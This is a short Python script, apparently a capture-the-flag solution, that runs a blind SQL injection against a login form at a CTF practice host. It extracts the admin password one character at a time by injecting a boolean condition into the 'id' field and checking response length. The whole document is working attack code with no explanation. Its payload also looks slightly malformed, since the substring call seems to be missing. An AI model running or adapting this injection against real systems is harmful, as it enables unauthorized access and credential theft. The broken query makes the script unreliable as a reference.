import requests

def main():
    ans = ''
    for index in range(1,22):
        for char_number in range(48, 123):
            char = chr(char_number)
            sql = f"admin\' AND (SELECT pass FROM user WHERE id=\'admin\', {index}, 1) = \'{char}\'; --"
            parse = {
                'id': sql,
                'password':''
            }
            result = requests.post(url,data=parse)
            if len(result.text) > 2000:
                ans = ans+char
                break
        print(ans)


if __name__ == "__main__":
    url = 'http://ctfq.sweetduet.info:10080/~q6/'
    main()
